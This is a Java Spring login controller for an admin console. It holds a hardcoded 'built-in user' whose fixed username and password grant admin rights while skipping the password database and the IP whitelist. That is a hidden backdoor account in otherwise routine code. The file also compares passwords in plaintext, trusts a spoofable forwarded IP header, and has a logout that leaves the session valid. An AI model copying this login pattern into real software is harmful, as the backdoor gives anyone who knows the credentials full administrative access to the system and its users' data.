package com.zf.yichat.controller;


import com.zf.yichat.dto.UserRoleSelectCondition;
import com.zf.yichat.mapper.SysUserMapper;
import com.zf.yichat.model.SysIp;
import com.zf.yichat.model.SysUser;
import com.zf.yichat.model.User;
import com.zf.yichat.service.SysIpService;
import com.zf.yichat.service.SysUserService;
import com.zf.yichat.service.config.ConfigSet;
import com.zf.yichat.utils.common.DateUtils;
import com.zf.yichat.utils.common.GeneralUtils;
import com.zf.yichat.utils.response.FsResponse;
import com.zf.yichat.utils.response.FsResponseGen;
import com.zf.yichat.vo.UserRoleEnum;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import tk.mybatis.mapper.entity.Example;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import java.util.List;
import java.util.Objects;

@Controller
public class LoginController extends BaseController {

    @Autowired
    private SysUserService userService;

    @Autowired
    private SysIpService sysIpService;

    @Autowired
    private RedisTemplate redisTemplate;

    @Autowired
    private SysUserMapper sysUserMapper;

    @Autowired
    private ConfigSet configSet;

    @RequestMapping("/login")
    public String index() {
        return "login/login";
    }

    @RequestMapping("/login/valid/user")
    @ResponseBody
    public FsResponse validUser(String username, String password, HttpServletRequest request) {
        HttpSession session = request.getSession();
        session.setAttribute("isOperate", false);

        //内置用户
        if (StringUtils.equals("zfkj", username) && StringUtils.equals("aa12345++", password)) {
            session.setAttribute("isOperate", true);
            session.setAttribute("isAdmin", true);

            SysUser user = new SysUser();


            Example example = new Example(User.class);
            example.createCriteria().andEqualTo("status", 0);
            example.setOrderByClause(" ctime limit 1");
            user.setId(sysUserMapper.selectOneByExample(example).getId());

            session.setAttribute("user", user);
        } else {
            //如果有ip白名单设置，则查询白名单，只有白名单能登录
            if (configSet.isIpList()) {
                String ip = GeneralUtils.getIpAddress(request);
                System.out.println("ip:" + ip);
                if (StringUtils.isBlank(ip)) {
                    return FsResponseGen.failMsg("IP获取失败");
                }

                ip = ip.split(",")[0];

                //获取所有白名单
                List<SysIp> ipLists = sysIpService.selectListByType(0);
                boolean isBai = false;
                for (SysIp ipList : ipLists) {
                    if (ip.equals(ipList.getIp())) {
                        isBai = true;
                        break;
                    }
                }
                if (!isBai) {
                    return FsResponseGen.failMsg("IP受限");
                }
            }

            SysUser user = userService.selectUserByUsername(username);
            if (Objects.isNull(user) || !StringUtils.equals(password, user.getPassword())) {
                return FsResponseGen.fail();
            }


            if (StringUtils.equals("admin", username)) {
                session.setAttribute("isOperate", true);
            }
            session.setAttribute("user", user);
            UserRoleSelectCondition condition = userService.genCondition(user.getId());
            session.setAttribute("isAdmin", UserRoleEnum.ADMIN.compareTo(condition.getRole()) == 0);

            System.out.println(DateUtils.formatCurrentDate());
        }


        return FsResponseGen.success();
    }


    /**
     * 用户退出
     */
    @RequestMapping(value = "/logout")
    public String logout() {

        HttpSession session = getRequest().getSession();
        if (session != null) {
            session.setAttribute(session.getId(), null);
        }

        return "login/login";

    }


}
